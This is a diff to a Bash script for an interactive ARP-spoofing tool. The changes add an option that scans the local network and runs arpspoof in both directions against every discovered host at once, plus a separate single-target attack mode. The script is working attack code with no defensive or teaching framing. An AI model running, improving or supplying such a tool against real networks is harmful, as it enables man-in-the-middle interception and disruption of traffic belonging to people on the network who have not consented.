@@ -3,14 +3,14 @@
 # Check if the required tools are available
 check_tools() {
     if ! [ -x "$(command -v $1)" ]; then
-        echo -e "\033[1;31m Error: $1 is not installed. Please install $1 and try again. \033[0m" >&2
+        echo -e "\033[1;31mError: $1 is not installed. Please install $1 and try again.\033[0m" >&2
         exit 1
     fi
 }
 
 check_tools "dsniff"
 check_tools "arp-scan"
-check_tools "netdiscover"
+check_tools "arpspoof"
 
 # Function to display the banner
 show_banner() {
@@ -32,35 +32,53 @@ show_banner() {
 # Function to display the menu
 show_menu() {
     echo -e "\n\033[1;33mMenu:\033[0m"
-    echo -e "\033[1;32m 1. Scan network and perform ARP attack\033[0m"
-    echo -e "\033[1;32m 2. ARP attack status\033[0m"
-    echo -e "\033[1;32m 3. Stop ARP attack\033[0m"
-    echo -e "\033[1;32m 4. Exit\033[0m"
+    echo -e "\033[1;32m 1. Scan network and perform ARP attack on all devices\033[0m"
+    echo -e "\033[1;32m 2. Perform ARP attack on a specific IP\033[0m"
+    echo -e "\033[1;32m 3. ARP attack status\033[0m"
+    echo -e "\033[1;32m 4. Stop ARP attack\033[0m"
+    echo -e "\033[1;32m 5. Exit\033[0m"
 }
 
-# Function to scan the network and perform ARP attack
+# Function to scan the network and perform ARP attack on all devices
 scan_and_attack() {
     echo -e "\033[0;33m"
-    read -p "Show interface IP: " red
+    read -p "Enter interface name (e.g., eth0, wlan0): " interface
     echo -e "\033[1;31mScanning network for active hosts...\033[0m"
-    ips=$(arp-scan -I "$red" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}')
+    ips=$(arp-scan -I "$interface" --localnet | grep -Eo '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v "$(hostname -I)")
 
     # Display the found IP addresses
     echo -e "\033[1;33mActive hosts on the network:\033[0m"
-    echo -e "\033[1;37m $ips"
-
-    # Read the target IP address
-    echo -e "\033[1;36m "
-    read -p "Enter the target's IP: " ip
+    echo -e "\033[1;37m$ips"
 
     # Calculate the gateway address
     gateway=$(ip route | grep default | awk '{print $3}')
 
-    # ARP attack
-    echo "Performing ARP spoofing attack against $ip in background..."
-    arpspoof -i "$red" -t "$ip" "$gateway" > /dev/null 2>&1 &
+    # ARP attack on all discovered IPs
+    echo "Performing ARP spoofing attack against all discovered hosts in background..."
+    for ip in $ips; do
+        arpspoof -i "$interface" -t "$ip" "$gateway" > /dev/null 2>&1 &
+        arpspoof -i "$interface" -t "$gateway" "$ip" > /dev/null 2>&1 &
+    done
 
-    # Clean up and exit the script
+    echo -e "\033[1;32mARP spoofing attack launched against all discovered hosts.\033[0m"
+    echo -e "\033[0m"
+}
+
+# Function to perform ARP attack on a specific IP
+attack_specific_ip() {
+    echo -e "\033[0;33m"
+    read -p "Enter interface name (e.g., eth0, wlan0): " interface
+    read -p "Enter the target's IP: " target_ip
+
+    # Calculate the gateway address
+    gateway=$(ip route | grep default | awk '{print $3}')
+
+    # ARP attack on the specific IP
+    echo "Performing ARP spoofing attack against $target_ip in background..."
+    arpspoof -i "$interface" -t "$target_ip" "$gateway" > /dev/null 2>&1 &
+    arpspoof -i "$interface" -t "$gateway" "$target_ip" > /dev/null 2>&1 &
+
+    echo -e "\033[1;32mARP spoofing attack launched against $target_ip.\033[0m"
     echo -e "\033[0m"
 }
 
@@ -87,10 +105,11 @@ while true; do
     read -p "Enter your choice: " option
     case $option in
         1) scan_and_attack ;;
-        2) check_attack_status ;;
-        3) stop_attack ;;
-        4) echo -e "\033[36mbay bay!\033[0m"; exit ;;
+        2) attack_specific_ip ;;
+        3) check_attack_status ;;
+        4) stop_attack ;;
+        5) echo -e "\033[36mGoodbye!\033[0m"; exit ;;
         *) echo -e "\033[1;31mInvalid option. Please try again.\033[0m" ;;
     esac
     read -p "Press Enter to continue..." # Pause until user presses Enter
-    done
+done
